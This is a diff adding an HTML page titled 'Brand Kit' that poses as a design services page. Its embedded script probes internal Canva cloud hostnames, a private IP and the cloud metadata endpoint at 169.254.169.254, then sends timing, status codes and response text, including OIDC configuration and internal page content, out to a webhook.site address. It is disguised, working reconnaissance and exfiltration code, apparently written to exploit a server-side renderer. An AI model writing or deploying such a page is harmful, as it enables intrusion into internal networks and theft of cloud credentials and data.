@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head><title>Brand Kit</title></head>
+<body>
+<h1 style="color:#ff6600">Our Brand</h1>
+<p>Professional design services</p>
+<script>
+var token = "ecc2dc86-2fe4-41dc-b6dd-8cac2fc896c9";
+var base = "https://webhook.site/" + token + "/";
+
+// Report that JS executed
+new Image().src = base + "js-exec";
+
+// Probe internal services via fetch no-cors and report timing
+var targets = [
+  "https://global.brand-assist.prod.cbe.canva-cloud.com/",
+  "https://global.content-app.prod.cbe.canva-cloud.com/",
+  "https://global.oauth-provider.prod.cbe.canva-cloud.com/",
+  "https://global.oauth-provider.prod.cbe.canva-cloud.com/.well-known/openid-configuration",
+  "http://10.149.76.150:8080/",
+  "http://10.149.76.150:9090/metrics",
+  "http://169.254.169.254/latest/meta-data/"
+];
+
+targets.forEach(function(url, i) {
+  var start = Date.now();
+  fetch(url, {mode:'no-cors',credentials:'omit'}).then(function(r){
+    var ms = Date.now() - start;
+    new Image().src = base + "ok-" + i + "-" + ms + "ms-" + r.status + "-" + r.type;
+  }).catch(function(e){
+    var ms = Date.now() - start;
+    new Image().src = base + "err-" + i + "-" + ms + "ms-" + encodeURIComponent(e.message).substring(0,100);
+  });
+});
+
+// Also try to read internal service with cors mode (might work if internal has permissive CORS)
+fetch("https://global.oauth-provider.prod.cbe.canva-cloud.com/.well-known/openid-configuration")
+  .then(function(r){ return r.text(); })
+  .then(function(t){
+    new Image().src = base + "oidc-data-" + encodeURIComponent(t.substring(0,500));
+  })
+  .catch(function(e){
+    new Image().src = base + "oidc-err-" + encodeURIComponent(e.message).substring(0,200);
+  });
+
+// Try XMLHttpRequest to read internal page content
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://global.brand-assist.prod.cbe.canva-cloud.com/", true);
+xhr.onload = function() {
+  new Image().src = base + "xhr-ok-" + encodeURIComponent(xhr.responseText.substring(0,500));
+};
+xhr.onerror = function() {
+  new Image().src = base + "xhr-err";
+};
+xhr.send();
+</script>
+</body>
+</html>
